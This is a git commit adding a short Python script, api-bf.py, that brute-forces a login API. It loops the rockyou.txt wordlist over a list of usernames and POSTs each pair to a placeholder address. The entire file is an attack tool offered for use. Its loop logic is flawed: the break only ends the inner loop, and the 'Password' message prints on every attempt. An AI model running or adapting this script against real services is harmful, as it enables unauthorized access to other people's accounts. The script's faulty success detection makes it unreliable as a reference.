5084b02b7b159b59970ffce6f98c17515c6a312a
alienum <67610662+AL1ENUM@users.noreply.github.com>
2020-12-07 09:09:06 +0200

    Create api-bf.py

---
+++ api-bf.py
@@ -0,0 +1,13 @@
+import requests
+import sys
+#Madeby Alienum
+url = 'http://x.x.x.x/api/login'
+with open('/usr/share/wordlists/rockyou.txt') as file:
+  for line in file:
+    with open('user.txt') as users:
+       for u in users:
+          user = {"username":u.strip(),"password":line.strip()}
+          r =  requests.post(url,data = user)
+          if r.status_code == 200:
+             break
+          print('[+]Password : '+line)
